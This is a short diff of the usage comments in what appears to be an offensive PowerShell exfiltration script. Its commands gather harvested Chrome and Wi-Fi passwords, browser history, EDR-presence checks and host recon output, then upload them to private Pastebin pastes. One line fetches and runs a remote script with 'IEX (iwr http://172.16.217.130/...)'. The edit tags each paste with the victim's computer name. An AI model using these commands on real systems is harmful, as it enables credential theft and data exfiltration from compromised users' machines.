@@ -23,9 +23,9 @@
 	Out-Pastebin -InputObject $(Get-Content C:\Users\Marco\Desktop\to_be_uploaded.txt, C:\Users\Marco\Desktop\to_be_uploaded2.txt) -PasteTitle "TOP" -ExpiresIn 10M -Visibility Private
 	
 	Final Recon Exfil:
-	Out-Pastebin -InputObject $(Get-Content C:\Windows\Temp\Check_EDR_Presence.txt, C:\Windows\Temp\Host_Recon_Complete.txt, C:\Windows\Temp\Chorme_PW.txt, C:\Windows\Temp\Wifi_PW.txt, C:\Windows\Temp\Browsers_History.txt) -PasteTitle "Full_Recon_" -ExpiresIn 10M -Visibility Private
+	Out-Pastebin -InputObject $(Get-Content C:\Windows\Temp\Check_EDR_Presence.txt, C:\Windows\Temp\Host_Recon_Complete.txt, C:\Windows\Temp\Chorme_PW.txt, C:\Windows\Temp\Wifi_PW.txt, C:\Windows\Temp\Browsers_History.txt) -PasteTitle "Full_Recon_$env:computername" -ExpiresIn 10M -Visibility Private
 	
-	powershell.exe IEX (iwr http://172.16.217.130/Out-Pastebin.ps1); Out-Pastebin -InputObject $(Get-Content C:\Windows\Temp\Check_EDR_Presence.txt, C:\Windows\Temp\Host_Recon_Complete.txt, C:\Windows\Temp\Chorme_PW.txt, C:\Windows\Temp\Wifi_PW.txt, C:\Windows\Temp\Browsers_History.txt) -PasteTitle "Full_Recon_" -ExpiresIn 10M -Visibility Private
+	powershell.exe IEX (iwr http://172.16.217.130/Out-Pastebin.ps1); Out-Pastebin -InputObject $(Get-Content C:\Windows\Temp\Check_EDR_Presence.txt, C:\Windows\Temp\Host_Recon_Complete.txt, C:\Windows\Temp\Chorme_PW.txt, C:\Windows\Temp\Wifi_PW.txt, C:\Windows\Temp\Browsers_History.txt) -PasteTitle "Full_Recon_$env:computername" -ExpiresIn 10M -Visibility Private
 
 #>
 
